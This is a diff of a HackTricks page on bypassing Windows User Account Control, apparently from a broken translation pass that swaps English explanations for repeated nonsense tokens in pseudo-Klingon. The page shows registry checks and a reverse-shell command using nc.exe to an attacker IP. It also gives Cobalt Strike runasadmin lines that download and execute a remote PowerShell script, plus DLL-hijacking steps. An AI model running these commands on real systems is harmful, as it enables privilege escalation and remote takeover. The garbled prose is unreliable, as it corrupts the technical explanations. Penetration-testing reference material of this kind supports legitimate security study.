@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
@@ -47,7 +47,6 @@ This [page](https://docs.microsoft.com/en-us/windows/security/identity-protectio
 | [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
 | [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
 | [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |
-
 ### UAC Bypass Theory
 
 Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.
@@ -59,31 +58,27 @@ You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe*
 ### Check UAC
 
 To confirm if UAC is enabled do:
-
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    EnableLUA    REG_DWORD    0x1
+EnableLUA    REG_DWORD    0x1
 ```
+**`1`** **vItlhutlh** UAC **chel**, **`0`** **bej** **ghaH** **chel**, **be'** **ghaH** **chel**.
 
-If it's **`1`** then UAC is **activated**, if its **`0`** or it **doesn't exist**, then UAC is **inactive**.
-
-Then, check **which level** is configured:
-
+**vaj** **yIn** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **chel** **ch
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
+ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
-
-* If **`0`** then, UAC won't prompt (like **disabled**)
-* If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
-* If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
-* If **`3`** like `1` but not necessary on Secure Desktop
-* If **`4`** like `2` but not necessary on Secure Desktop
-* if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges
+* **`0`** -> **`0`**. UAC won't prompt (like **disabled**)
+* **`1`** -> **`1`**. admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
+* **`2`** -> **`2`**. UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
+* **`3`** -> **`3`**. like `1` but not necessary on Secure Desktop
+* **`4`** -> **`4`**. like `2` but not necessary on Secure Desktop
+* **`5`** -> **`5`**. it will ask the administrator to confirm to run non Windows binaries with high privileges
 
 Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
 If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.
@@ -101,32 +96,19 @@ If **`0`**(default), the **built-in Administrator account can** do remote admini
 All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`
 
 You can also check the groups of your user and get the integrity level:
-
 ```
 net user %username%
 whoami /groups | findstr Level
 ```
-
 ## UAC bypass
 
 {% hint style="info" %}
-Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAS prompt appears
-{% endhint %}
-
-The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.
-
-It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**
-
-### UAC disabled
-
-If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
-
+ghItlhvam vItlhutlh. vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'chugh vItlhutlhbe'ch
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-
 #### UAC bypass with token duplication
 
 * [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
@@ -139,7 +121,6 @@ If you have a shell with a user that is inside the Administrators group you can 
 {% hint style="warning" %}
 **Looks like this trick isn't working anymore**
 {% endhint %}
-
 ```bash
 net use Z: \\127.0.0.1\c$
 cd C$
@@ -147,11 +128,13 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
+### UAC bypass with cobalt strike
+
+Cobalt Strike techniques will only work if UAC is not set at its max security level.
 
 ### UAC bypass with cobalt strike
 
-The Cobalt Strike techniques will only work if UAC is not set at it's max security level
-
+Cobalt Strike techniques will only work if UAC is not set at its max security level.
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -163,7 +146,6 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-
 **Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.
 
 ### KRBUACBypass
@@ -176,7 +158,6 @@ Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://git
 You should **be careful** because some bypasses will **prompt some other programs** that will **alert** the **user** that something is happening.
 
 UACME has the **build version from which each technique started working**. You can search for a technique affecting your versions:
-
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -184,9 +165,6 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-
-Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page you get the Windows release `1607` from the build versions.
-
 #### More UAC bypass
 
 **All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).
@@ -214,8 +192,8 @@ If you take a look to **UACME** you will note that **most UAC bypasses abuse a D
 1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
 2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
 3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
-   1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
-   2. **IFileOperation**: Windows 10.
+1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
+2. **IFileOperation**: Windows 10.
 4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.
 
 ### Another UAC bypass technique
